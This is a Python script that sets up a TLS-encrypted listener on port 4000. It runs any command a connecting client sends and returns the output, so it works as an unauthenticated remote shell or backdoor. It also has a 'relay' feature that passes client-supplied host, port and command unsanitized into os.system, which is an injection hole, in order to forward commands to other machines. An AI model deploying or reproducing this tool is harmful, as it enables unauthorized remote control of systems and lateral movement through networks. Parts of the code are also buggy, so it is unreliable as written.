import socket
import ssl
import PySimpleGUI as sg
from subprocess import run
import os

def interact(cert ,key ,host ,port, data="0"):

    #Needs cert and key generated:
    #openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 365


    context = ssl.SSLContext()
    context.load_cert_chain(certfile=cert, keyfile=key)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
        sock.bind((host, port))
        sock.listen(5)
        with context.wrap_socket(sock, server_side=True) as ssock:
            while 1:
                conn, addr = ssock.accept()
                print('Connected by', addr)
                while 1:
                    recieve = conn.recv(1024)
                    if (recieve  !=0):
                        break
                    print(f"Recieved: {recieve}")
                recieve=recieve.decode()
                command_split=recieve.split(" ")
                if (command_split[0]=="relay"): #Nicely close the encrypted channel
                    host=command_split[1]
                    port=command_split[2]
                    command=command_split[3]
#                    interact(cert, key, host, port, command)
                    os.system("python3 test.py -u "+str(host)+" -p "+str(port)+" -c "+str(command))
                else:
                    command = run(command_split, capture_output=True).stdout
                    conn.send(command)
def get_host_info():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    host=(s.getsockname()[0])
    s.close()
    return host
if __name__=="__main__":
    port = 4000
    cert="./cert.pem"
    key="./key.pem"
    host=get_host_info()
    interact(cert ,key, host ,port)
